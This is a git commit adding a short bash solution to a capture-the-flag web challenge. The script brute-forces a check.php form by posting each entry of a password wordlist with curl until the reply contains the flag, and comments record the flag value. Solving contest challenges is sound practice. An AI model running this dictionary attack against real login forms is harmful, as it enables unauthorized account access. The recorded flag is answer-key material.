2f3e7a5e534b9f77e917c9fd126074045c92f841
James Wang <jameswang9909@hotmail.com>
2016-03-20 22:15:51 -0400

    Solve Web 3

---
+++ Web-3_30-WITHHELD/solution.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+while read line; do
+    response=$(curl -s http://web.camsctf.com/3/check.php -d "answer=$line")
+    if [[ $response =~ Flag ]]; then
+        echo $line
+        echo $response
+        break
+    fi
+done < passwords.txt
+
+# {"correct":1,"reply":"Flag: nev3r_use_123456"}
+# {nev3r_use_123456 }
